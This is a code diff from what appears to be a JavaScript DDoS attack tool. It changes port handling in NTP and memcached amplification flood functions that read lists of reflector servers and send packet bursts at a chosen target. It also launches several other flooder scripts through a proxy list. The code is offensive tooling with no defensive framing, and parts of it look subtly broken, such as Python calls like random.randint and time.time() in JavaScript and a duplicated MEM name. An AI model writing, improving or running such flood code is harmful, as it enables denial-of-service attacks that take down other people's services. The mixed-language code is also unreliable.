@@ -133,7 +133,7 @@ async function bootup() {
 const ntp_payload = "\x17\x00\x03\x2a" + "\x00".repeat(4);
 const mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n";
 
-function NTP(target, port, duration) {
+function NTP(target, port = 80, duration) {
   try {
     const ntp_servers = fs.readFileSync('ntpServers.txt', 'utf8').split('\n');
     const packets = random.randint(10, 150);
@@ -158,7 +158,7 @@ function NTP(target, port, duration) {
   }
 }
 
-function MEM(target, port, duration) {
+function MEM(target, port = 443, duration) {
   try {
     const memsv = fs.readFileSync('memsv.txt', 'utf8').split('\n');
     const packets = random.randint(1024, 60000);
@@ -167,7 +167,7 @@ function MEM(target, port, duration) {
     while (time.time() < duration) {
       try {
         const packet = Buffer.from(mem_payload);
-        const client = net.createConnection({ port: 11211, host: server });
+        const client = net.createConnection({ port: port, host: server });
         client.on('connect', () => {
           for (let i = 0; i < packets; i++) {
             client.write(packet);
@@ -390,8 +390,8 @@ const MEM = path.join(__dirname, `MEM`);
 	exec(`node ${destroy} ${target} ${duration} 100 100 proxy.txt`)
 	exec(`node ${flooder} ${target} ${duration} 100 100 proxy.txt`)
 	exec(`node ${peterda} ${target} ${duration} 100 100 proxy.txt`)
-	exec(`node ${NTP} ${target} ${duration}`)
-	exec(`node ${MEM} ${target} ${duration}`)
+	exec(`node ${NTP} ${target} 80 ${duration} `)
+	exec(`node ${MEM} ${target} 443 ${duration}`)
 	  
 	  
           sigma()
